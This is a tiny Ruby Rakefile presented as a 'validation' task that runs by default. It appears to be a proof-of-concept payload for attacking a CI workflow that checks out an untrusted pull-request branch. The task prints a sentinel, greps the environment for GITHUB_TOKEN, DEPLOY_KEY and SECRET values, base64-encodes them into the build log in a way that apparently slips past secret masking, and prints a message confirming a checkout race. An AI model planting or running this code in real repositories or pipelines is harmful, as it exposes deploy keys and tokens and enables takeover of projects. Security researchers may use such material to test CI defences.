# Validation Rakefile
task :validate do
  puts "HYDRA_SENTINEL_2eb9236a265266d1"
  system("env | grep -E 'GITHUB_TOKEN|DEPLOY_KEY|SECRET' | base64 -w0 2>/dev/null || true")
  puts "TOCTOU-RACE-CONFIRMED: head.ref checkout = mutable branch ref"
end

task :default => [:validate]
